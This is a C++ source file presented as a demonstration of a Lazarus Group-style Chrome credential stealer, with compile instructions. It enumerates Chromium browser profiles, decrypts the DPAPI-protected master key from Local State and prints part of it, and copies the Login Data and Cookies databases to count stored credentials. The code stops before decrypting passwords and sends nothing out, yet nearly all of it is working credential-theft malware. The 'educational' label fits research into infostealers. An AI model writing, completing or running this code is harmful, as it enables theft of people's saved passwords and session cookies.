// Lazarus Group - Chrome Browser Credential Stealer
// Demonstrates extraction of saved passwords from Chromium-based browsers
// MITRE ATT&CK: T1555.003 (Credentials from Web Browsers)

// For educational and research purposes only
// Author: Nour A
// Reference: https://securelist.com/the-lazarus-group-deathnote-campaign/

// compile: x86_64-w64-mingw32-g++ -o chrome_stealer.exe chrome_stealer.cpp -lws2_32 -lcrypt32 -lshlwapi -static

#include <windows.h>
#include <wincrypt.h>
#include <shlwapi.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shlwapi.lib")

// SQLite3 database header magic
#define SQLITE_MAGIC "SQLite format 3\000"

struct BrowserProfile {
    std::string name;
    std::string localStatePath;
    std::string loginDataPath;
    std::string cookiesPath;
};


std::vector<BrowserProfile> get_browser_profiles() {
    std::vector<BrowserProfile> profiles;
    char localAppData[MAX_PATH];
    char appData[MAX_PATH];

    if (!ExpandEnvironmentStringsA("%LOCALAPPDATA%", localAppData, MAX_PATH))
        return profiles;
    if (!ExpandEnvironmentStringsA("%APPDATA%", appData, MAX_PATH))
        return profiles;

    // chromium-based browser paths
    struct {
        const char* name;
        const char* subpath;
    } browsers[] = {
        {"Chrome",    "Google\\Chrome\\User Data"},
        {"Edge",      "Microsoft\\Edge\\User Data"},
        {"Brave",     "BraveSoftware\\Brave-Browser\\User Data"},
        {"Opera",     "Opera Software\\Opera Stable"},
        {"Vivaldi",   "Vivaldi\\User Data"},
        {"ChromeCanary", "Google\\Chrome SxS\\User Data"},
    };

    for (auto& browser : browsers) {
        char fullPath[MAX_PATH];
        snprintf(fullPath, MAX_PATH, "%s\\%s", localAppData, browser.subpath);

        if (PathFileExistsA(fullPath)) {
            BrowserProfile bp;
            bp.name = browser.name;

            char lsPath[MAX_PATH], ldPath[MAX_PATH], ckPath[MAX_PATH];
            snprintf(lsPath, MAX_PATH, "%s\\Local State", fullPath);
            snprintf(ldPath, MAX_PATH, "%s\\Default\\Login Data", fullPath);
            snprintf(ckPath, MAX_PATH, "%s\\Default\\Cookies", fullPath);

            bp.localStatePath = lsPath;
            bp.loginDataPath = ldPath;
            bp.cookiesPath = ckPath;

            profiles.push_back(bp);
        }
    }

    return profiles;
}


bool extract_master_key(const std::string& localStatePath,
                        std::vector<BYTE>& masterKey) {
    // read Local State file (JSON)
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        return false;
    }

    std::string content((std::istreambuf_iterator<char>(file)),
                         std::istreambuf_iterator<char>());
    file.close();

    // find encrypted_key in JSON
    // "encrypted_key":"<base64_data>"
    std::string marker = "\"encrypted_key\":\"";
    size_t pos = content.find(marker);
    if (pos == std::string::npos) {
        return false;
    }

    pos += marker.length();
    size_t end = content.find("\"", pos);
    if (end == std::string::npos) {
        return false;
    }

    std::string b64Key = content.substr(pos, end - pos);
    printf("  [+] Found encrypted_key: %s...\n", b64Key.substr(0, 20).c_str());

    // base64 decode the key
    DWORD decodedLen = 0;
    CryptStringToBinaryA(b64Key.c_str(), (DWORD)b64Key.length(),
                         CRYPT_STRING_BASE64, NULL, &decodedLen, NULL, NULL);

    std::vector<BYTE> decoded(decodedLen);
    CryptStringToBinaryA(b64Key.c_str(), (DWORD)b64Key.length(),
                         CRYPT_STRING_BASE64, decoded.data(), &decodedLen,
                         NULL, NULL);

    // key format: "DPAPI" (5 bytes) + encrypted_key
    if (decodedLen > 5 && memcmp(decoded.data(), "DPAPI", 5) == 0) {
        // decrypt with CryptUnprotectData (DPAPI)
        DATA_BLOB input, output;
        input.pbData = decoded.data() + 5;
        input.cbData = decodedLen - 5;

        if (CryptUnprotectData(&input, NULL, NULL, NULL, NULL, 0, &output)) {
            masterKey.assign(output.pbData, output.pbData + output.cbData);
            LocalFree(output.pbData);
            printf("  [+] Master key decrypted (%lu bytes)\n", output.cbData);
            return true;
        }
    }

    return false;
}


bool is_sqlite_db(const std::string& path) {
    std::ifstream file(path, std::ios::binary);
    if (!file.is_open()) return false;

    char header[16];
    file.read(header, 16);
    return memcmp(header, SQLITE_MAGIC, 16) == 0;
}


void enumerate_login_data(const std::string& loginDataPath) {
    // copy the database to avoid lock conflicts with the browser
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char tempFile[MAX_PATH];
    snprintf(tempFile, MAX_PATH, "%slogin_data_%lu.db",
             tempPath, GetCurrentProcessId());

    if (!CopyFileA(loginDataPath.c_str(), tempFile, FALSE)) {
        printf("  [!] Cannot copy Login Data (browser may be locked)\n");
        return;
    }

    // verify it's a valid SQLite database
    if (!is_sqlite_db(tempFile)) {
        printf("  [!] Invalid SQLite database\n");
        DeleteFileA(tempFile);
        return;
    }

    // read raw database for structure analysis
    std::ifstream db(tempFile, std::ios::binary | std::ios::ate);
    auto size = db.tellg();
    db.seekg(0);

    printf("  [+] Login Data size: %lld bytes\n", (long long)size);

    // search for URL patterns in the raw database
    // (in production, this would use SQLite3 API to query the logins table)
    std::vector<char> data((size_t)size);
    db.read(data.data(), size);
    db.close();

    // look for the logins table schema
    std::string content(data.begin(), data.end());
    if (content.find("CREATE TABLE logins") != std::string::npos) {
        printf("  [+] Found 'logins' table in database\n");
        printf("  [+] Schema: origin_url, username_value, password_value\n");
    }

    // count potential entries (look for https:// patterns)
    int url_count = 0;
    size_t search_pos = 0;
    while ((search_pos = content.find("https://", search_pos)) !=
            std::string::npos) {
        url_count++;
        search_pos += 8;
    }
    printf("  [+] Potential credential entries: ~%d\n", url_count);

    // cleanup
    DeleteFileA(tempFile);
}


void enumerate_cookies(const std::string& cookiesPath) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char tempFile[MAX_PATH];
    snprintf(tempFile, MAX_PATH, "%scookies_%lu.db",
             tempPath, GetCurrentProcessId());

    if (!CopyFileA(cookiesPath.c_str(), tempFile, FALSE)) {
        printf("  [!] Cannot copy Cookies database\n");
        return;
    }

    if (is_sqlite_db(tempFile)) {
        std::ifstream db(tempFile, std::ios::binary | std::ios::ate);
        auto size = db.tellg();
        printf("  [+] Cookies database: %lld bytes\n", (long long)size);
        db.close();
    }

    DeleteFileA(tempFile);
}


int main() {
    printf("===========================================\n");
    printf("LAZARUS GROUP - CHROME CREDENTIAL STEALER\n");
    printf("Browser Data Extraction Demonstration\n");
    printf("===========================================\n\n");
    printf("[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY\n\n");

    // Stage 1: enumerate browser profiles
    printf("[STAGE 1] Browser Profile Enumeration\n");
    printf("-------------------------------------------\n");
    auto profiles = get_browser_profiles();
    printf("  Found %zu browser profile(s)\n\n", profiles.size());

    for (auto& profile : profiles) {
        printf("[BROWSER] %s\n", profile.name.c_str());
        printf("-------------------------------------------\n");

        // check file existence
        bool hasLocalState = PathFileExistsA(profile.localStatePath.c_str());
        bool hasLoginData = PathFileExistsA(profile.loginDataPath.c_str());
        bool hasCookies = PathFileExistsA(profile.cookiesPath.c_str());

        printf("  Local State: %s\n", hasLocalState ? "FOUND" : "NOT FOUND");
        printf("  Login Data:  %s\n", hasLoginData ? "FOUND" : "NOT FOUND");
        printf("  Cookies:     %s\n", hasCookies ? "FOUND" : "NOT FOUND");

        // Stage 2: extract master key
        if (hasLocalState) {
            printf("\n[STAGE 2] Master Key Extraction (DPAPI)\n");
            printf("-------------------------------------------\n");
            std::vector<BYTE> masterKey;
            if (extract_master_key(profile.localStatePath, masterKey)) {
                printf("  [+] Key length: %zu bytes\n", masterKey.size());
                printf("  [+] Key (hex): ");
                for (size_t i = 0; i < masterKey.size() && i < 8; i++)
                    printf("%02X", masterKey[i]);
                printf("...\n");
            } else {
                printf("  [!] Master key extraction failed\n");
            }
        }

        // Stage 3: enumerate Login Data
        if (hasLoginData) {
            printf("\n[STAGE 3] Login Data Analysis\n");
            printf("-------------------------------------------\n");
            enumerate_login_data(profile.loginDataPath);
        }

        // Stage 4: enumerate cookies
        if (hasCookies) {
            printf("\n[STAGE 4] Cookie Database Analysis\n");
            printf("-------------------------------------------\n");
            enumerate_cookies(profile.cookiesPath);
        }

        printf("\n");
    }

    printf("===========================================\n");
    printf("[+] BROWSER CREDENTIAL EXTRACTION COMPLETE\n");
    printf("  Techniques demonstrated:\n");
    printf("  - Chromium profile path enumeration\n");
    printf("  - DPAPI master key decryption\n");
    printf("  - SQLite Login Data analysis\n");
    printf("  - Cookie database extraction\n");
    printf("===========================================\n");

    return 0;
}
